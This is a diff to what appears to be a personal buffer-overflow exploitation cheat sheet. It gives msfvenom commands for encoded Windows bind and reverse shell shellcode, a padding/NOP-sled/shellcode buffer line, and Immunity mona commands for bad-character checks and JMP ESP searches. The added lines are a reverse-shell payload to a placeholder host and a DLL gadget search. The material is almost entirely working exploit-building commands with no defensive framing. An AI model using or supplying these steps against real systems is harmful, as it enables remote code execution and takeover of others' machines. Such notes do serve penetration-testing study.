@@ -3,6 +3,8 @@ Buffer Overflows
 
 msfvenom -a x86 --platform windows -p windows/ shell_bind_tcp LPORT=4321 - b '\x00\x11\x22\x33\x44' -f python
 
+msfvenom -p windows/shell_reverse_tcp LHOST=X.X.X.X LPORT=1234 -f c –e x86/shikata_ga_nai -b "\x11\x22\x33"
+
 msfvenom -p windows/shell_bind_tcp LPORT=1234 -b '\x00\x11\x22\x33\x44' -f c
 
 junk = "\x41" * pattern_ofset + '\x11\x22\x33\x44'+ '\x90' * 20 + shellcode +'\x42' * (buffer_size-pattern_ofset-4-20-
@@ -74,6 +76,11 @@ IMMUNITY
 !mona jmp -m * -r esp
 !mona bytearray
 !mona compare -c c:\logs\XXXX\bytearray.bin -a 0x000000
+
+Find DLL
+********
+!mona find -s "\xff\xe4" -m slmfc.dll
+mona config -set workingfolder c:mona%p
 
 ============================
 
